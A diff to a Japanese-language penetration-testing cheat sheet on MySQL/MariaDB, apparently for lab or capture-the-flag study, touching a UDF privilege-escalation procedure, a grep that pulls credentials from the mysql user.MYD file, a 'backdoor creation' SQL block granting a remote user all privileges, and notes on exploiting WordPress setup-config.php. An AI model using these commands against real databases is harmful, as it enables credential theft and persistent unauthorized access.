@@ -143,6 +143,8 @@ SELECT table_name, column_name, table_schema FROM information_schema.columns WHE
 
 ### 実行手順 (Linux例)
 
+- [ ] todo:claudeみて修整
+
 1. UDF ライブラリをバイナリ（または16進数）でテーブルに流し込む
 ```sql
 USE mysql;
@@ -199,8 +201,8 @@ grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_na
 ## ユーザー追加（バックドア作成）
 
 ```sql
-CREATE USER 'hacker'@'%' IDENTIFIED BY 'P@ssw0rd123';
-GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' WITH GRANT OPTION;
+CREATE USER '<username>'@'%' IDENTIFIED BY '<password>';
+GRANT ALL PRIVILEGES ON *.* TO '<username>'@'%' WITH GRANT OPTION;
 FLUSH PRIVILEGES;
 ```
 
@@ -210,7 +212,7 @@ FLUSH PRIVILEGES;
 
 ## MariaDB を 0.0.0.0:3306 でホストする手順
 
-- WordPressのsetup-config.phpをエクスプロイトするためなどに使用 ([Exploit-DB - 18417](https://www.exploit-db.com/exploits/18417))
+- WordPressのsetup-config.phpをエクスプロイトするためなどに使用 (🔗[Exploit-DB - 18417](https://www.exploit-db.com/exploits/18417))
 - Kali ではMySQLを起動してもMariaDBが起動する（MariaDBはMySQLのfork）
 	-  `mysql`コマンドは MariaDB のエイリアスとして機能し、ユーザーからは MySQL として使えるが、実体は MariaDB
 
